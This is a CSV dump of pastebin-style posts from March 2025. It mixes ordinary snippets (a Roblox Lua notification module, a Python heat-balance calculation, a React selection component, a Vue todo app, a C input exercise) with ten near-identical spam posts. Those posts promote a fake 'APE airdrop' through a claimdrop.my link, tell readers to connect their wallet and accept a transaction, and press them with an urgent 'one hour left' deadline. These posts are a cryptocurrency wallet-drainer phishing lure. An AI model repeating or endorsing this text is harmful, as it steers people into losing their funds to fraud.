id,title,username,language,date,content
ZhTinGGW,idk,SomthingNewFromThing,Lua,Sunday 2nd of March 2025 03:57:59 AM CDT,"local TweenService = game:GetService(""TweenService"")
local RunService = game:GetService(""RunService"")
local TextService = game:GetService(""TextService"")
local x = Instance.new(""UICorner"")
x.Name = ""CornerEdgeController""
x.Parent = game:GetService(""ReplicatedStorage"")
x.CornerRadius = UDim.new(0,10)
local ccc = x:Clone()
local Player = game:GetService(""Players"").LocalPlayer

local NotifGui = Instance.new(""ScreenGui"")
NotifGui.Name = ""AkaliNotif""
NotifGui.Parent = RunService:IsStudio() and Player.PlayerGui or game:GetService(""CoreGui"")

local Container = Instance.new(""Frame"")
Container.Name = ""Container""
Container.Position = UDim2.new(1, -320, 0.5, -20)
Container.Size = UDim2.new(0, 300, 0.5, 0)
Container.BackgroundTransparency = 1
Container.Parent = NotifGui

local Padding = 10
local DescriptionPadding = 10
local InstructionObjects = {}
local TweenTime = 1
local TweenStyle = Enum.EasingStyle.Sine
local TweenDirection = Enum.EasingDirection.Out

local LastTick = tick()

local function CalculateBounds(TableOfObjects)
    local X, Y = 0, 0
    for _, Object in ipairs(TableOfObjects) do
        X += Object.AbsoluteSize.X
        Y += Object.AbsoluteSize.Y
    end
    return {X = X, Y = Y, x = X, y = Y}
end

local CachedObjects = {}

local function FadeProperty(Object)
    local PropertyMap = {
        TextLabel = ""TextTransparency"",
        TextButton = ""TextTransparency"",
        Frame = ""BackgroundTransparency"",
        ImageLabel = ""ImageTransparency"",
        ImageButton = ""ImageTransparency""
    }
    local Property = PropertyMap[Object.ClassName]
    if Property then
        local Tween = TweenService:Create(Object, TweenInfo.new(0.25, TweenStyle, TweenDirection), {[Property] = 1})
        Tween:Play()
    end
end

local function Update()
    local DeltaTime = tick() - LastTick
    local PreviousObjects = {}

    for _, Object in ipairs(InstructionObjects) do
        local Label, Delta, Done = Object[1], Object[2], Object[3]
        if not Done then
            if Delta < TweenTime then
                Object[2] = math.clamp(Delta + DeltaTime, 0, 1)
                Delta = Object[2]
            else
                Object[3] = true
            end
        end
        local NewValue = TweenService:GetValue(Delta, TweenStyle, TweenDirection)
        local CurrentPos = Label.Position
        local PreviousBounds = CalculateBounds(PreviousObjects)
        local TargetPos = UDim2.new(0, 0, 0, PreviousBounds.Y + (Padding * #PreviousObjects))
        Label.Position = CurrentPos:Lerp(TargetPos, NewValue)
        table.insert(PreviousObjects, Label)
    end
    CachedObjects = PreviousObjects
    LastTick = tick()
end

RunService:BindToRenderStep(""UpdateList"", 0, Update)

local function FadeOutAfter(Object, Seconds)
    task.wait(Seconds)
    FadeProperty(Object)
    for _, SubObj in ipairs(Object:GetDescendants()) do
        FadeProperty(SubObj)
    end
    task.wait(0.25)
    table.remove(InstructionObjects, table.find(InstructionObjects, Object))
end

return {
    Notify = function(Properties)
        local Title = Properties.Title
        local Description = Properties.Description
        local Duration = Properties.Duration or 5
        local Color = Properties.Color or Color3.fromRGB(30, 30, 30)
        
        if Title or Description then
            local Y = Title and 26 or 0
            if Description then
                local TextSize = TextService:GetTextSize(Description, 14, Enum.Font.Gotham, Vector2.new(0, 0))
                for i = 1, math.ceil(TextSize.X / (Container.AbsoluteSize.X - Padding - DescriptionPadding)) do
                    Y += TextSize.Y
                end
                Y += 8
            end

            local NewLabel = Instance.new(""Frame"")
            NewLabel.Size = UDim2.new(1, 0, 0, Y)
            NewLabel.Position = UDim2.new(1, -320, 0, CalculateBounds(CachedObjects).Y + (Padding * #CachedObjects))
            NewLabel.BackgroundColor3 = Color
            NewLabel.BackgroundTransparency = 0.5
            NewLabel.Parent = Container
            ccc.Parent = NewLabel

            if Title then
                local NewTitle = Instance.new(""TextLabel"")
                NewTitle.Text = Title
                NewTitle.Font = Enum.Font.GothamSemibold
                NewTitle.TextSize = 14
                NewTitle.BackgroundTransparency = 1
                NewTitle.TextColor3 = Color3.new(1, 1, 1)
                NewTitle.Size = UDim2.new(1, -10, 0, 26)
                NewTitle.Position = UDim2.fromOffset(10, 0)
                NewTitle.Parent = NewLabel
            end

            if Description then
                local NewDescription = Instance.new(""TextLabel"")
                NewDescription.Text = Description
                NewDescription.Font = Enum.Font.Gotham
                NewDescription.TextSize = 14
                NewDescription.BackgroundTransparency = 1
                NewDescription.TextWrapped = true
                NewDescription.Size = UDim2.fromScale(1, 1) + UDim2.fromOffset(-DescriptionPadding, Title and -26 or 0)
                NewDescription.Position = UDim2.fromOffset(10, Title and 26 or 0)
                NewDescription.TextColor3 = Color3.new(1, 1, 1)
                NewDescription.Parent = NewLabel
            end

            local ProgressBar = Instance.new(""Frame"")
            ProgressBar.Size = UDim2.new(1, 0, 0, 4)
            ProgressBar.Position = UDim2.new(0, 0, 1, -4)
            ProgressBar.BackgroundColor3 = Color
            ProgressBar.BorderSizePixel = 0
            ProgressBar.Parent = NewLabel

            TweenService:Create(ProgressBar, TweenInfo.new(Duration, TweenStyle, TweenDirection), {Size = UDim2.new(0, 0, 0, 4)}):Play()
            coroutine.wrap(FadeOutAfter)(NewLabel, Duration)
            table.insert(InstructionObjects, {NewLabel, 0, false})
        end
    end,
}
"
1sxDuLK1,бжд 1 проверка,lolhopen,Python,Sunday 2nd of March 2025 03:53:05 AM CDT,"import math

V = 0.2 #скорость воздуха
Sbody = 1.7 #площадь тела
Tv = 22 #температура воздуха
Tp = 30 #температура поверхности
Pmax = 4197 #максимальное напряжение водных паров
Pabs = 1107 #абсолютная влажность воздуха
M = 177.24 #величина теплопродукции организма человека

C = 6.978*(0.5+math.sqrt(V)) * Sbody * (Tv - Tp)
R = 6.489*Sbody*(Tv-Tp)
pot = 0.001*(Pmax - Pabs)*(0.5+math.sqrt(V))
I = 40.82*pot
Q = M+R+C-I

print (C)
print(R)
print(I)
print(Q)
print()"
2jREhKaw,FREE CRYPTO,itxrxchh,JavaScript,Sunday 2nd of March 2025 03:52:01 AM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#GUt6wQkgP3"
eDDwV9Kw,🔥 Make $500+ from APE AIRDROP 🔥,itxrxchh,JavaScript,Sunday 2nd of March 2025 03:41:50 AM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#1P6ohRSj2w"
XVRMmC01,🚨 FINAL CALL - $APE AIRDROP 🚨,itxrxchh,JavaScript,Sunday 2nd of March 2025 03:31:46 AM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#uMdJYWNlKp"
pw2zrGSM,🚨 FINAL CALL - $APE AIRDROP 🚨,yinyin99,JavaScript,Sunday 2nd of March 2025 03:21:22 AM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#jD4ue8UYCF"
QT8pRFN7,TimerScript (LocalScript) (Ponchokings Tutorial),Sungmingamerpro13,CSS,Sunday 2nd of March 2025 03:14:39 AM CDT,"local TimerEvent = game.ReplicatedStorage.TimerEvent

local player = game.Players.LocalPlayer
local TimerImage = player.PlayerGui:WaitForChild(""DialogueGui"").TimerImage

local stopTimer = false

TimerEvent.OnClientEvent:Connect(function(Time)
	TimerImage.Visible = true
	wait(1)
	repeat
		Time = Time - 1
		TimerImage.TextLabel.Text = Time
		wait(1)
	until Time <= 0 or stopTimer == true
	stopTimer = false
	TimerImage.Visible = false
end)
"
KFFqYcUp,Element Selection,maghrabyy,JavaScript,Sunday 2nd of March 2025 03:14:30 AM CDT,"function ProductsList({ currentCollectionId, collectionsList }) {
  const navigate = useNavigate();
  const [isSelectEnabled, setIsSelectEnabled] = useState(false);
  const [selectedProducts, setSelectedProducts] = useState(new Map());
  const [search, setSearch] = useState("""");

  const { isPending: isProductsLoading, data: products } = useGetProducts({
    collection: currentCollectionId,
  });

  const filteredProducts =
    products?.data.filter((prod) =>
      prod.name.toLowerCase().includes(search.toLowerCase())
    ) || [];

  const productSelectedHandler = (prod) => {
    setSelectedProducts((prev) => new Map(prev).set(prod.product_id, prod));
  };

  const productDeselectHandler = (prod) => {
    setSelectedProducts((prev) => {
      const newSet = new Map(prev);
      newSet.delete(prod.product_id);
      return newSet;
    });
  };

  const handleSelectAllProducts = () => {
    setSelectedProducts(
      new Map(filteredProducts.map((product) => [product.product_id, product]))
    );
  };

  const handleDeselectAllProducts = () => {
    setSelectedProducts(new Map());
  };

  const handleCancelSelection = () => {
    setIsSelectEnabled(false);
    handleDeselectAllProducts();
  };

  const isAllProductsSelected = filteredProducts.every((product) =>
    selectedProducts.has(product.product_id)
  );

  const renderSelectionButtons = () => {
    if (isSelectEnabled) {
      return (
        <Button
          onClick={
            isAllProductsSelected
              ? handleDeselectAllProducts
              : handleSelectAllProducts
          }
        >
          {isAllProductsSelected ? ""Deselect All"" : ""Select All""}
        </Button>
      );
    }

    if (!isSelectEnabled)
      return <Button onClick={() => setIsSelectEnabled(true)}>Select</Button>;
  };

  useEffect(() => {
    handleCancelSelection();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [currentCollectionId]);
  return isProductsLoading ? (
    <PageLoader />
  ) : (
    <>
      <div style={{ ...style, marginTop: ""20px"" }}>
        <input
          type=""search""
          onChange={(e) => setSearch(e.target.value)}
          placeholder=""Search""
          style={{
            width: ""50%"",
            padding: ""10px"",
            border: ""0"",
            borderRadius: ""20px"",
          }}
        />
        <div style={buttonDivStyle}>
          {isSelectEnabled ? (
            <Button onClick={handleCancelSelection}>Cancel</Button>
          ) : (
            <Button
              onClick={() =>
                navigate(
                  `/products/addProduct?collection=${currentCollectionId}`
                )
              }
            >
              Add Product
            </Button>
          )}
          {renderSelectionButtons()}
        </div>
      </div>
      <div
        style={{
          display: ""grid"",
          gridTemplateColumns: ""1fr 1fr"",
          gap: ""10px"",
          maxWidth: ""300px"",
        }}
      >
        {filteredProducts.map((product) => (
          <ProductCard
            key={product.product_id}
            product={product}
            selected={selectedProducts.has(product.product_id)}
            enabledSelection={isSelectEnabled}
            onProductSelected={productSelectedHandler}
            onProductDeselect={productDeselectHandler}
          />
        ))}
      </div>
      {isSelectEnabled && (
        <ProductsActions
          selectedProducts={selectedProducts}
          collectionsList={collectionsList}
          onActionSuccess={handleCancelSelection}
        />
      )}
    </>
  );
}"
GfsifEgj,🚨 LAST CHANCE TO CLAIM APE COINS 🚨,herrderringe,JavaScript,Sunday 2nd of March 2025 03:11:18 AM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#pfFe32x7HU"
AArUTnBV,Untitled,dllbridge,C,Sunday 2nd of March 2025 03:04:55 AM CDT,"


#include <stdio.h>

int foo(char *p);

//////////////////////////////////////////////////
int main()
{
    
    int n = 99;
    
    char sz[99];
    
    printf(""3 digits: "");  
    

    scanf(""%s"", &sz[0]); 
    
   // printf(""3 digits = %s\n"", &sz[0]);  
    
    
    n = foo(sz);
    
    
    
    printf(""n = %i\n"", n); 
    
}


///////////////////////////////////////////////////
int foo(char *p)
{
    printf("" p = %i\n"",  p);
    printf(""*p = %c\n"", *p);    
return 777;    
}






















/*
#include <stdio.h>

//////////////////////////////////////////////////
int main()
{
    
    int n;
    
    int nArr[7];
    
    printf(""3 digits: "");  
    
    for(int i = 0; i < 3; i++)
    {
        scanf(""%i"", &nArr[i]);    
    }
    
    printf(""nArr[0] = %2d\n"", nArr[0]);
    printf(""nArr[1] = %2d\n"", nArr[1]); 
    printf(""nArr[2] = %2d\n"", nArr[2]);   
    
    n  = nArr[0] * 100;
    n += nArr[1] *  10;
    n += nArr[2] *   1;
    
    printf(""n = %i\n"", n);        
}



*/



"
024FBGhG,FREE CRYPTO,herrderringe,JavaScript,Sunday 2nd of March 2025 03:01:04 AM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#1NV0SWBbXH"
XKrDYrN0,🔥 Make $500+ from APE AIRDROP 🔥,herrderringe,JavaScript,Sunday 2nd of March 2025 02:50:58 AM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#eXScySVrlh"
fBHzsRCD,🚨 FINAL CALL - $APE AIRDROP 🚨,herrderringe,JavaScript,Sunday 2nd of March 2025 02:40:56 AM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#OVI8AjW8HW"
RRXeX6vs,🚨 LAST CHANCE TO CLAIM APE COINS 🚨,herrderringe,JavaScript,Sunday 2nd of March 2025 02:30:54 AM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#F7Uv7zW8iU"
rBDd7gZm,Basic Todo App,SalehITC,JavaScript,Sunday 2nd of March 2025 02:24:54 AM CDT,"<script setup>
import { onMounted, ref, computed } from 'vue'
import { useQuasar } from 'quasar'
import axios from 'axios'
import {
  calculateIncompleteTodos,
  calculateCompleteTodos,
  calculateTotalTodos,
} from 'src/repositories/todo.js'

const BASE_URL = ref('http://dream-course-todo-be.test/api/v1')
const HTTP_HEADERS = ref({
  Accept: 'application/json',
  'Content-Type': 'application/json',
})

const $q = useQuasar()

const formData = ref({})
const fetchingState = ref(true)
const todos = ref([])

onMounted(async () => {
  await getAllTodos()
  fetchingState.value = false
})

const AXIOS = () => {
  return axios.create({
    baseURL: BASE_URL.value,
    headers: HTTP_HEADERS.value,
  })
}

const toastAlert = (message = '') => {
  $q.notify({
    message,
    position: 'bottom',
    color: 'positive',
    timeout: 3000,
    progress: true,
  })
}

const getAllTodos = async () => {
  const {
    data: { code, data: allTodos },
  } = await AXIOS().get('todos')
  if (code == 200) {
    todos.value = allTodos.map((todo) => {
      return {
        ...todo,
        is_completed: todo?.is_completed ? true : false,
      }
    })
  }
}

const handleTodoCreate = async () => {
  const payload = {
    ...formData.value,
    is_completed: false,
  }
  const {
    data: { code, data: todo, message },
  } = await AXIOS().post('todos', payload)
  if (code == 201) {
    todos.value.unshift(todo)
    toastAlert(message)
  }
  formData.value = {}
}

const handleTodoDelete = (id, listIndex) => {
  $q.dialog({
    title: 'Confirm',
    message: 'Are you sure you want to delete this todo?',
    cancel: {
      color: 'grey-6',
      flat: true,
    },
    ok: {
      color: 'negative',
      label: 'Okay',
      unelevated: true,
    },
  }).onOk(async () => {
    const {
      data: { status, message },
    } = await AXIOS().delete(`todos/${id}`)
    if (status == 202) {
      todos.value.splice(listIndex, 1)
      toastAlert(message)
    }
    formData.value = {}
  })
}

const handleTodoStatusUpdate = async (data, itemIndex) => {
  const { id, is_completed } = data
  const {
    data: { data: todo, code, message },
  } = await AXIOS().put(`todos/${id}`, { is_completed })

  if (code == 200) {
    todos.value[itemIndex] = { ...todos.value[itemIndex], ...todo }
    toastAlert(message)
  }
}

const getIncompleteTodos = computed(() => {
  return calculateIncompleteTodos(todos.value)
})

const getCompletedTodos = computed(() => {
  return calculateCompleteTodos(todos.value)
})

const getTotalTodos = computed(() => {
  return calculateTotalTodos(todos.value)
})
</script>

<template>
  <q-page padding>
    <div class=""row justify-center q-mt-md"">
      <div class=""col-lg-5 col-md-6 col-sm-8 col-12"">
        <div class=""row justify-center todo-add-block"">
          <div class=""col-12"">
            <q-item class=""q-px-none"">
              <q-form class=""full-width"">
                <q-input
                  v-model.trim=""formData.title""
                  outlined
                  label=""Add your todo""
                  clearable
                  class=""todo-input""
                >
                  <template v-slot:append>
                    <q-btn
                      color=""blue-2""
                      text-color=""primary""
                      icon=""add""
                      dense
                      unelevated
                      round
                      type=""submit""
                      size=""13px""
                      class=""todo-submit-class""
                      @click=""handleTodoCreate""
                    />
                  </template>
                </q-input>
              </q-form>
            </q-item>
          </div>
        </div>
      </div>
    </div>
    <div class=""row justify-center q-mt-xs"">
      <div class=""col-lg-5 col-md-6 col-sm-8 col-12"">
        <div v-if=""fetchingState"" class=""row justify-center"">
          <div class=""col-12 text-center q-mb-sm"">
            <q-spinner-grid color=""primary"" size=""2em"" />
          </div>
          <div class=""col-12 text-center text-caption text-grey-7"">Fetching Data...</div>
        </div>
        <div v-else class=""row justify-center"">
          <div v-if=""todos?.length"" class=""col-md-12"">
            <q-chip
              dense
              text-color=""white""
              color=""primary""
              :label=""`Total: ${getTotalTodos}`""
              class=""q-mb-sm q-mr-xs q-px-sm""
            />
            <q-chip
              dense
              text-color=""white""
              color=""negative""
              :label=""`Incomplete: ${getIncompleteTodos}`""
              class=""q-mb-sm q-mr-xs""
            />
            <q-chip
              dense
              text-color=""white""
              color=""positive""
              :label=""`Completed: ${getCompletedTodos}`""
              class=""q-mb-sm q-px-sm""
            />
            <q-card bordered flat class=""q-mt-xs"">
              <q-list bordered separator>
                <q-item
                  v-for=""(todo, index) in todos""
                  :key=""index""
                  clickable
                  v-ripple
                  class=""todo-item""
                >
                  <q-item-section side>
                    <q-badge
                      :label=""`#${index + 1}`""
                      class=""q-mr-sm""
                      color=""grey-2""
                      text-color=""grey-9""
                    />
                  </q-item-section>
                  <q-item-section>
                    <q-item-label lines=""2"">
                      {{ todo?.title }}
                    </q-item-label>
                  </q-item-section>
                  <q-item-section side>
                    <div>
                      <q-checkbox
                        v-model=""todo.is_completed""
                        dense
                        class=""q-mr-md todo-checkbox""
                        @update:model-value=""
                          ($event) => {
                            handleTodoStatusUpdate({ is_completed: $event, id: todo?.id }, index)
                          }
                        ""
                      />
                      <q-btn
                        color=""red-1""
                        text-color=""negative""
                        icon=""delete""
                        round
                        unelevated
                        dense
                        size=""10px""
                        @click=""handleTodoDelete(todo?.id, index)""
                      />
                    </div>
                  </q-item-section>
                </q-item>
              </q-list>
            </q-card>
          </div>
          <div v-else class=""text-center text-caption text-grey-7"">No Data Found</div>
        </div>
      </div>
    </div>
  </q-page>
</template>
"
2EcE5GJL,FREE CRYPTO,herrderringe,JavaScript,Sunday 2nd of March 2025 02:20:53 AM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#2QL7EJj4L9"
